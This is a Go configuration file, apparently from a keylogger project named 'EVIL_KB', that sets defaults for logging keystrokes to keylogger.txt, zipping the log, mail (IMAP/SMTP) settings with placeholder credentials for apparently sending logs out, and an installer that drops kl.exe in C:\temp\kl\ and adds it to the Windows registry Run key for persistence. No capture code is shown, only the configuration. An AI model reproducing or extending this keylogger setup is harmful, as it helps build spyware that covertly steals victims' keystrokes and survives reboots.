package config

/*
Create <Config> - init Config structure
	Returns <*Config>:
		1. Structure pointer
*/
func (c *Config) Create() *Config {
	c = &Config{
		cfg: Cfg{
			Service: Service{
				Name: "EVIL_KB",
				ID:   "ec871226-7f5b-425b-bad4-f52fb6577d1f",
			},
			Logger: Logger{
				Path:  "./logs.txt",
				Level: 0,
			},
			Mail: Mail{
				IMAP: IMAP{
					Username:      "imapuser@mail.ru",
					Password:      "password",
					Host:          "localhost",
					Port:          993,
					IncomingBox:   "INBOX",
					CheckInterval: 10,
				},
				SMTP: SMTP{
					Username: "smtpuser@mail.ru",
					Password: "password",
					Host:     "localhost",
					Port:     25,
					Name:     "some-user-name",
					From:     "from@mail.ru",
				},
			},
			Keylogger: Keylogger{
				Path: "./",
				Name: "keylogger.txt",
			},
			Zipper: Zipper{
				Path: "./",
				Name: "keylogger.zip",
			},
			Installer: Installer{
				ServicePath: "C:\\temp\\kl\\",
				ServiceName: "kl.exe",
				RegPath:     "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
				RegName:     "some_name",
			},
		},
	}

	return c
}

/*
GetConfig <Config> - getting a config of service
	Returns <Cfg>:
		1. config object
*/
func (c *Config) GetConfig() Cfg {
	return c.cfg
}
